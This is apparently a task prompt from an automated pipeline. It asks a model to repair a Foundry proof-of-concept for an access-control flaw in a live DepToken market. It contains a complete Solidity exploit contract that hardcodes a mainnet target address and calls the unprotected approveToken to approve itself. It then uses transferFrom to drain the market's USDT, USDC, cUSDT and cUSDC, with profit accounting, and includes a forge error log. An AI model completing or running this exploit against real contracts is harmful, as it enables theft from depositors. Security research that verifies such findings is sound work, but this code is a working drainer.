You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public arbitrary-token approval lets any caller steal the market's USDT, cUSDT, and other ERC-20 balances
- claim: `approveToken` is a public function inherited by the live DepToken contract and has no access control. Any address can make the market approve an arbitrary spender for any ERC-20 held by the contract. Since the market custody includes idle USDT and Compound cUSDT, an attacker can approve themself and then use `transferFrom` on those token contracts to pull funds out of the protocol.
- impact: A permissionless attacker can drain the protocol's underlying USDT, its cUSDT position, and any other ERC-20 balance held by the market, immediately rendering depositors insolvent and breaking redemptions.
- exploit_paths: ["Call `approveToken(USDTAddress, attacker, amount)` or `approveToken(compoundV2cUSDTAddress, attacker, amount)` on the market.", "Call the approved token's `transferFrom(depToken, attacker, amount)` to move assets out of the protocol.", "Repeat for each token balance the market holds."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
}

interface IDepTokenApprovalBug {
    function approveToken(address token, address spender, uint256 amount) external returns (bool);
    function underlying() external view returns (address);
    function USDT_ADDRESS() external view returns (address);
    function USDC_ADDRESS() external view returns (address);
}

interface ICompoundComptrollerLike {
    function getAllMarkets() external view returns (address[] memory);
}

contract FlawVerifier {
    address internal constant TARGET = 0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f;
    address internal constant COMPOUND_COMPTROLLER = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B;

    address internal constant CANONICAL_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant CANONICAL_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    IDepTokenApprovalBug internal constant TARGET_CONTRACT = IDepTokenApprovalBug(TARGET);

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        address underlyingToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.underlying.selector),
            CANONICAL_USDT
        );
        address usdtToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.USDT_ADDRESS.selector),
            CANONICAL_USDT
        );
        address usdcToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.USDC_ADDRESS.selector),
            CANONICAL_USDC
        );

        // The live market stores Compound market addresses internally rather than exposing
        // them via public getters. Looking them up from the canonical Compound comptroller by
        // underlying token is a realistic on-chain discovery step that preserves the same
        // exploit causality: identify a token held by the market, make the market approve us,
        // then pull that token out with transferFrom.
        address cUsdtToken = _findCompoundMarket(usdtToken);
        address cUsdcToken = _findCompoundMarket(usdcToken);

        address[5] memory candidates = [underlyingToken, usdtToken, cUsdtToken, usdcToken, cUsdcToken];

        // Exploit path:
        // 1. Call the public approveToken on the market for a market-held ERC20.
        // 2. Use transferFrom on that ERC20 to move the approved balance out.
        // 3. Repeat for each protocol-known token balance the market holds.
        for (uint256 i = 0; i < candidates.length; i++) {
            address token = candidates[i];
            if (_alreadySeen(candidates, i, token)) {
                continue;
            }
            _drainToken(token);
        }

        _refreshProfit(candidates);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _drainToken(address token) internal {
        if (token == address(0)) {
            return;
        }

        uint256 victimBalance = _balanceOf(token, TARGET);
        if (victimBalance == 0) {
            return;
        }

        // The vulnerable implementation wraps ERC20 approve with SafeERC20.safeApprove.
        // Resetting allowance to zero first keeps the approval path compatible with tokens
        // such as USDT that reject non-zero -> non-zero allowance changes.
        require(_callApproveToken(token, 0), "approve zero failed");
        require(_callApproveToken(token, victimBalance), "approve amount failed");
        require(_safeTransferFrom(token, TARGET, address(this), victimBalance), "transferFrom failed");
    }

    function _refreshProfit(address[5] memory candidates) internal {
        _profitToken = address(0);
        _profitAmount = 0;

        for (uint256 i = 0; i < candidates.length; i++) {
            address token = candidates[i];
            if (_alreadySeen(candidates, i, token) || token == address(0)) {
                continue;
            }

            uint256 bal = _balanceOf(token, address(this));
            if (bal > _profitAmount) {
                _profitToken = token;
                _profitAmount = bal;
            }
        }
    }

    function _callApproveToken(address token, uint256 amount) internal returns (bool ok) {
        bytes memory data;
        (ok, data) = TARGET.call(
            abi.encodeWithSelector(IDepTokenApprovalBug.approveToken.selector, token, address(this), amount)
        );
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        return abi.decode(data, (bool));
    }

    function _findCompoundMarket(address underlyingToken) internal view returns (address market) {
        if (underlyingToken == address(0)) {
            return address(0);
        }

        (bool ok, bytes memory data) = COMPOUND_COMPTROLLER.staticcall(
            abi.encodeWithSelector(ICompoundComptrollerLike.getAllMarkets.selector)
        );
        if (!ok || data.length == 0) {
            return address(0);
        }

        address[] memory markets = abi.decode(data, (address[]));
        for (uint256 i = 0; i < markets.length; i++) {
            address candidateUnderlying = _readAddressFrom(markets[i], abi.encodeWithSignature("underlying()"));
            if (candidateUnderlying == underlyingToken) {
                return markets[i];
            }
        }

        return address(0);
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _safeTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(bytes4(keccak256("transferFrom(address,address,uint256)")), from, to, amount)
        );
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        return abi.decode(data, (bool));
    }

    function _readAddress(bytes memory callData, address fallbackValue) internal view returns (address) {
        (bool ok, bytes memory data) = TARGET.staticcall(callData);
        if (!ok || data.length < 32) {
            return fallbackValue;
        }

        address decoded = abi.decode(data, (address));
        if (decoded == address(0)) {
            return fallbackValue;
        }
        return decoded;
    }

    function _readAddressFrom(address targetAddress, bytes memory callData) internal view returns (address) {
        (bool ok, bytes memory data) = targetAddress.staticcall(callData);
        if (!ok || data.length < 32) {
            return address(0);
        }
        return abi.decode(data, (address));
    }

    function _alreadySeen(address[5] memory values, uint256 end, address needle) internal pure returns (bool) {
        if (needle == address(0)) {
            return true;
        }

        for (uint256 i = 0; i < end; i++) {
            if (values[i] == needle) {
                return true;
            }
        }

        return false;
    }
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code does not contain any key anchors from paths; generated code does not cover paths indexes: 0, 1
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
